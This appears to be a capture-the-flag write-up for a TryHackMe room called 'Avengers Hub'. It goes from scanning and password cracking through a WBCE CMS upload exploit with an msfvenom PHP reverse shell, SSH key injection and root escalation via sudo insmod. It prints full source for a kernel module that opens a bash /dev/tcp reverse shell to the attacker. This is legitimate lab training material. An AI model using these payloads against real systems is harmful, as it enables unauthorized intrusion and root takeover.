# 🛡️ Hello guys, welcome to this THM *Avengers Hub* write-up!

---

## 🧭 Step 0 – Preparation

Before diving into the challenge, here’s our setup:

- **My IP (attacker)**: `10.20.20.20`  
- **Target IP (target)**: `10.30.02.20`

---

## 🔎 Step 1 – Scanning the Target with Nmap

To begin, we perform a basic **version scan** using Nmap to detect open ports and identify the services running on the target machine.

```bash
nmap -sV 10.30.02.20
```

> 💡 The `-sV` flag enables service version detection.

---

## 🌐 Step 2 – Exploring the Web Server

We found open port 80 hosts a web server. Visiting it shows a **"Site under maintenance"** message. This usually means there might be hidden directories.

---

## 🧪 Step 3 – Directory Enumeration

Now we’re going to try to discover hidden directories on the website, since the homepage doesn’t give us anything useful to work with.

To do this, we can use tools like dirsearch, gobuster, or ffuf.
In my case, I used dirsearch :
```bash
python3 dirsearch.py -u http://10.30.02.20
```

We discover a few directories. By exploring them, we find a suspicious file: `breakglass.zip`.
By trying to open it we see that it ask us a password. To access its content, we need to crack the password.

---

## 📦 Step 4 – Cracking the ZIP File

We found a ZIP file, but it’s password-protected. To access its content, we need to crack the password.

First, we use `zip2john`, a tool that extracts a hash from the ZIP file. This hash represents the encrypted password and can be used by John the Ripper.

```bash
zip2john breakglass.zip > hash.txt
```

This creates a `hash.txt` file that contains the ZIP’s password hash.

Then, we use `john` (John the Ripper) to try to crack the password using a rockyou wordlist :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Inside the ZIP, we find a file with an **MD5 hash** for the admin password. We will try to decrypt it online (e.g., https://md5decrypt.net).

🎉 We recover the admin password.

---

## 🧑‍💻 Step 5 – Accessing the Admin Interface (WBCE CMS)

The Admin interface is a CMS **WBCE 1.6.2**. Searching online shows an exploit using `.inc` file upload:

https://www.exploit-db.com/exploits/52039

`.inc` files can be executed like `.php` on misconfigured servers.

---

## 🐚 Step 6 – Reverse Shell via WBCE CMS Exploit

We gonna Generate a PHP reverse shell in `.inc` format:

```bash
msfvenom -p php/reverse_php LHOST=10.20.20.20 LPORT=4444 -f raw > shell.inc
```

We set up a listener:

```bash
nc -lvnp 4444
```

Uploading `shell.inc` to `/media/` in the CMS and trigger it in the browser.

🎉 We now have a shell as `www-data`.

---

## 🧍‍♂️ Step 7 – Privilege Escalation to User

Checking the privileges we currently have on the system
```bash
id
```

Then look for users:

```bash
ls /home/
```

We found the user `void` and the folder `/home/void/.ssh/` is **writable**.

---

## 🔑 Step 8 – SSH Key Injection

On our machine we generate an ssh public key:

```bash
ssh-keygen -t rsa -b 4096 -f mykey
cat mykey.pub
```

We then copy the content and inject it into the target:

```bash
echo "PASTE_YOUR_SSH_PUBLIC_KEY_HERE" > /home/void/.ssh/authorized_keys
```

Then connect via SSH:

```bash
ssh -i mykey void@10.30.02.20
```

🎉 You now have user access.

```bash
cat /home/void/flag.txt
```

---

## 👑 Step 9 – Escalating to Root with a Kernel Module

when we check what we can do with sudo:

```bash
sudo -l
```

We see permission to run `/sbin/insmod`, which loads a `.ko` kernel module.
> `.ko` files are **Linux kernel modules** — they are pieces of code that can be dynamically loaded into the Linux kernel to add or extend functionality (like drivers, features, or system-level behaviors).

The target machine already has `make` and kernel headers, so we’ll compile the module **directly on the target**.

---

## 🛠️ Step 10 – Creating the Kernel Module on the Target

### On the target, we create `cyberavengers.c`:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define REMOTE_IP "10.20.20.20"
#define REMOTE_PORT "8888"

static int reverse_shell_thread(void *data)
{
    char *argv[] = { "/bin/bash", "-c",
        "bash -i >& /dev/tcp/" REMOTE_IP "/" REMOTE_PORT " 0>&1", NULL };
    char *envp[] = { "PATH=/usr/bin:/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static int __init rev_init(void)
{
    printk(KERN_INFO "Reverse shell module loaded\n");
    kthread_run(reverse_shell_thread, NULL, "rev_shell");
    return 0;
}

static void __exit rev_exit(void)
{
    printk(KERN_INFO "Reverse shell module unloaded\n");
}

module_init(rev_init);
module_exit(rev_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CTF Participant");
MODULE_DESCRIPTION("Kernel module reverse shell");
```

---

### Still on the target, we create `Makefile`:

```makefile
obj-m += cyberavengers.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

---

## 🧨 Step 11 – Compile and Load the Module

### Compile on the target:

```bash
make
```

### Set up a listener on our attacker machine:

```bash
nc -lvnp 8888
```

### Run the module on the target:

```bash
sudo /sbin/insmod cyberavengers.ko
```

🎉 we now have a **root reverse shell** on our listener!

---

## 🏁 Final Step – Read the Root Flag

```bash
cat /root/flag.txt
```

---

## ✅ Challenge Complete

